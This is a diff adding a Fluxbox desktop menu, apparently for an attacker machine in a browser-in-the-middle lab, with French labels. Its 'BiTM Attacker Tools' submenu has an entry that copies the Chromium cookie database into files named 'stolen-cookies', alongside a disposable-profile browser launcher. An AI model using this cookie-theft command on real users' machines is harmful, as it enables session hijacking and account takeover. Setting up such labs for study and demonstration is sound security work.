@@ -1,0 +1,21 @@
+[begin] (Fluxbox)
+  [submenu] (BiTM Attacker Tools)
+    [exec] (Terminal) {xterm -geometry 100x30 -e bash}
+    [exec] (Nouveau Chromium) {chromium-browser --new-window --user-data-dir=/tmp/chromium-stealth-$RANDOM}
+    [exec] (Extraire Cookies) {xterm -hold -e 'cp ~/.config/chromium/Default/Cookies ~/stolen-cookies-$(date +%s).db && ls -lh ~/stolen-cookies-* && echo "Cookies copiés !"'}
+    [separator]
+    [exec] (Gestionnaire fichiers) {thunar 2>/dev/null || pcmanfm 2>/dev/null || xterm -e mc}
+  [end]
+  
+  [submenu] (Applications)
+    [exec] (Terminal) {xterm}
+    [exec] (Navigateur) {chromium-browser}
+  [end]
+  
+  [submenu] (Système)
+    [restart] (Redémarrer Fluxbox)
+    [separator]
+    [exit] (Quitter)
+  [end]
+  
+[end]
